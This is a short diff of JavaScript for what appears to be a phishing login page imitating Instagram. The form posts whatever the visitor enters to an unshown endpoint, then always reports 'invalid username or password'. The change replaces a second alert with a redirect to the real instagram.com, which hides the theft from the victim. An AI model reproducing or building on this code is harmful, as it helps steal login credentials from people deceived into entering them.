@@ -4,6 +4,6 @@ const form = document.forms['hello']
 form.addEventListener('submit', e => {
     e.preventDefault()
     fetch(scriptURL, { method: 'POST', body: new FormData(form) })
-        .then(response => alert("invalid username or password"), alert("try after some time"))
+        .then(response => alert("invalid username or password"),  window.location.href = "http://www.instagram.com")
         .catch(error => console.error('Error!', error.message))
 })
